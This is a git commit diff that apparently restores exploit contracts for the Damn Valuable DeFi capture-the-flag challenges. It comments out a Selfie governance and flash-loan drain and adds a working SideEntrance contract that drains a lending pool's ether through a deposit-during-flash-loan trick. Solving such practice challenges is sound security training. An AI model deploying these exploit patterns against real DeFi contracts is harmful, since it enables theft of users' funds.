2fc341c4ee36212738530b29922b4660d773c088
Crys <mariano.christopher123@gmail.com>
2023-05-03 07:24:01 +0800

    added back lost attack contracts

--- contracts/attacker-contracts/SelfieHack.sol
+++ contracts/attacker-contracts/SelfieHack.sol
@@ -1,47 +1,47 @@
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.0;
+// // SPDX-License-Identifier: MIT
+// pragma solidity ^0.8.0;
 
-import "../selfie/SelfiePool.sol";
+// import "../selfie/SelfiePool.sol";
 
-contract SelfieHack {
-    DamnValuableTokenSnapshot public token;
-    SelfiePool public pool;
-    SimpleGovernance public gov;
+// contract SelfieHack {
+//     DamnValuableTokenSnapshot public token;
+//     SelfiePool public pool;
+//     SimpleGovernance public gov;
 
-    uint256 actionId;
+//     uint256 actionId;
 
-    constructor(address _token, address _pool, address _gov) {
-        token = DamnValuableTokenSnapshot(_token);
-        pool = SelfiePool(_pool);
-        gov = SimpleGovernance(_gov);
-    }
+//     constructor(address _token, address _pool, address _gov) {
+//         token = DamnValuableTokenSnapshot(_token);
+//         pool = SelfiePool(_pool);
+//         gov = SimpleGovernance(_gov);
+//     }
 
-    receive() external payable {}
+//     receive() external payable {}
 
-    fallback() external payable {
-        token.snapshot();
-        token.transfer(address(pool), token.balanceOf(address(this)));
-    }
+//     fallback() external payable {
+//         token.snapshot();
+//         token.transfer(address(pool), token.balanceOf(address(this)));
+//     }
 
-    function attack() external {
-        actionId = gov.queueAction(
-            address(pool),
-            abi.encodeWithSignature(
-                "drainAllFunds(address)",
-                address(msg.sender)
-            ),
-            0
-        );
+//     function attack() external {
+//         actionId = gov.queueAction(
+//             address(pool),
+//             abi.encodeWithSignature(
+//                 "drainAllFunds(address)",
+//                 address(msg.sender)
+//             ),
+//             0
+//         );
 
-        pool.flashLoan(
-            address(this),
-            address(token),
-            token.balanceOf(address(pool)),
-            actionId
-        );
-    }
+//         pool.flashLoan(
+//             address(this),
+//             address(token),
+//             token.balanceOf(address(pool)),
+//             actionId
+//         );
+//     }
 
-    function attack2() external {
-        gov.executeAction(actionId);
-    }
-}
+//     function attack2() external {
+//         gov.executeAction(actionId);
+//     }
+// }
--- contracts/attacker-contracts/SideEntranceHack.sol
+++ contracts/attacker-contracts/SideEntranceHack.sol
@@ -1,4 +1,27 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-contract SideEntranceHack {}
+import "../side-entrance/SideEntranceLenderPool.sol";
+
+contract SideEntranceHack is IFlashLoanEtherReceiver {
+    SideEntranceLenderPool immutable pool;
+
+    constructor(address _pool) {
+        pool = SideEntranceLenderPool(_pool);
+    }
+
+    function attack() external {
+        pool.flashLoan(address(pool).balance);
+        pool.withdraw();
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    // The flashloan callback.
+    function execute() external payable override {
+        // Deposit the loan back into the pool, but under our name.
+        pool.deposit{value: msg.value}();
+    }
+
+    // Necessary for the withdrawal from the pool.
+    receive() external payable {}
+}
